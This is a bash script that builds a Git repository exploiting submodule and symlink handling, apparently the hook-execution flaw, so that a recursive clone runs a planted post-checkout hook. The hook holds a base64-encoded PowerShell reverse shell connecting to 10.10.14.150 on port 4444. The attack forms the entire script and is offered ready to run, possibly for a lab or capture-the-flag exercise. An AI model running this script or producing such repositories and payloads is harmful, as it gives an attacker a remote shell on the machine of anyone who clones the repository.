#!/bin/bash

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# optional, but I added it to avoid the warning message
git config --global init.defaultBranch main 


# Define the tell-tale path
tell_tale_path="$PWD/tell.tale"

# Initialize the hook repository
git init hook
cd hook
mkdir -p y/hooks

# Write the malicious code to a hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
powershell -e JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuMTAuMTQuMTUwIiwgNDQ0NCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQo=
EOF

# Make the hook executable: important
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"

cd ..

# Define the hook repository path
hook_repo_path="$(pwd)/hook"

# Initialize the captain repository
git init captain
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
cd ..

git clone --recursive captain hooked
